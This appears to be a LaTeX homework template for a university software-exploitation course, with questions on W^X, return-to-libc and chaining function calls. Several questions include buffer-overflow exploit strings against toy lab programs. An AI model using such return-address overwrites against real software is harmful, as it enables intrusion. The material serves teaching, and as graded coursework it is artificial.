@@ -1,0 +1,161 @@
+\documentclass{article}[9pt]
+
+\usepackage{listings}
+\usepackage{fullpage}
+\usepackage{textcomp}
+
+\lstset{ %
+  basicstyle=\ttfamily\small,
+  commentstyle=\ttfamily\small\emph,
+  upquote=true,
+  framerule=1.25pt,
+  breaklines=true,
+  showstringspaces=false,
+  escapeinside={(*@}{@*)},
+  belowskip=2em,
+  aboveskip=1em,
+}
+
+
+\newenvironment{answerfont}{\fontfamily{qhv}\selectfont}{\par}
+\newenvironment{myanswer}{\begin{mdframed}\begin{answerfont}}{\end{answerfont}\end{mdframed}}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%
+% To add an answer, use the myanswer environment command under \item heading,like
+%
+% \item What is the meaning of life, universe, everything?
+% \begin{mysanswer}
+%   The answer is 42!
+% \end{myanswer}
+%
+% You can also use macro's in your \myanswer if you want to control the
+% formatting. Such as verbatim enviroment or lstlisting environment.
+%
+% BUT(!) I have to be able to read/grade your resulting pdf to give you credit,
+% so make sure your home work is well formatted.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\title{SI485h: HW 08}
+\date{FILL IN THE DUE DATE}
+\author{FILL IN YOUR NAME}
+
+\begin{document}
+
+\maketitle
+\section*{Instructions}
+
+\begin{itemize}
+\item You must submit your homework using this Latex template.
+
+\item This homework is graded out of 70 points. Point values are associated to each question.
+\end{itemize}
+
+\section*{Questions}
+\label{sec:orgfb6c6bf}
+
+\begin{enumerate}
+\item (5 points) Explain the principle of w-⊗-x as a way to protect against stack
+smashing attacks that load shell code.
+
+\item (5 points) What \texttt{gcc} compilation is used to \textbf{tunr off} w-xor-x?
+
+\item (5 points) What is a return-to-libc attack?
+
+\item (5 points) What c-library function is typically called when performing a
+return-to-libc attack? Why do we choose this one?
+
+\item (5 points) Explain the \textbf{error} output and how we know that this was a successful exploit.
+
+\begin{verbatim}
+user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\x90\xa1\xe5\xb7'"`
+sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
+Segmentation fault (core dumped)
+\end{verbatim}
+
+\item (10 points) Draw the stack diagram for the function below after ret2libc
+attack is executed properly. Use the diagram to explain how you
+control the argument in a ret2libc attack.
+
+\begin{verbatim}
+void vuln(int i, char * s){
+
+  char buf[20];
+  strcpy(buf,s);
+
+  while(i-- > 0)
+    printf("%d: %s\n",i,buf);
+
+  return;
+}
+\end{verbatim}
+
+\item (5 points) Suppose you're exploiting the function below. You know that the
+value of \texttt{s} is 0xbfff625. Provide an exploit string for a
+re2libc attack that will launch a shell.
+
+\begin{verbatim}
+void vuln(char * s){
+
+  char buf[20];
+  strcpy(buf,s);
+
+  while(i-- > 0)
+    printf("%d: %s\n",i,buf);
+
+  return;
+}
+\end{verbatim}
+
+\item (5 point) If the function bad() is at address 0x0804847d and the address of
+good() is at address 0x0804852a, what order of functions results
+from the exploit string:
+
+\begin{verbatim}
+./prog `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08' + '\x2a\x85\x04\x08' + '\x2a\x85\x04\x08' + '\x7d\x84\x04\x08'"`
+\end{verbatim}
+
+\item (5 point) Consider that the function bad() is defined as following:
+
+\begin{verbatim}
+void bad(int a){printf("%#08x\n",a);}     
+\end{verbatim}
+
+and good() is defined as following
+
+\begin{verbatim}
+void good(){printf("Go Navy!\n");}     
+\end{verbatim}
+
+What is the output given the exploit string if good() and bad()
+is at the same location as before?
+
+\begin{verbatim}
+./prog `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08' + '\x2a\x85\x04\x08' + '\xbe\xba\xfe\xca' + '\xef\xbe\xad\xde'"`
+\end{verbatim}
+
+\item (5 point) Consider that the function bad() is defined as following:
+\begin{verbatim}
+void bad(int a, int b){printf("%#08x %#08x\n",a,b);}      
+\end{verbatim}
+
+And good() is defined the same as before, what will the output of the program be?
+
+\begin{verbatim}
+./prog `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08' + '\x2a\x85\x04\x08' + '\xbe\xba\xfe\xca' + '\xef\xbe\xad\xde'"`      
+\end{verbatim}
+
+\item (5 points) Given the definition of \texttt{bad(int a, int b)} and \texttt{good()} from
+above, why can we not create a exploit string where we call
+\texttt{bad(0xcafebabe,0xdeadbeef)} then \texttt{good()} and then \texttt{bad()} again
+such that this time \texttt{bad(0xbadf00d,0xfeed3e3e)} is called?
+
+\item (5 points) If we were to write an exploit string to do the sequence of
+function calls as desired above (ie, \texttt{bad(0xcafebabe)},
+\texttt{good(0xdeadbeef)}, then \texttt{bad(0xbadf00d,0xfeed3e3e)}): What
+gadget would we need?
+
+\item (5 points) Assuming the gadget was at memory address \texttt{0x080485a9},complete
+the exploit string to do the desired sequence of function calls.
+\end{enumerate}
+\end{document}
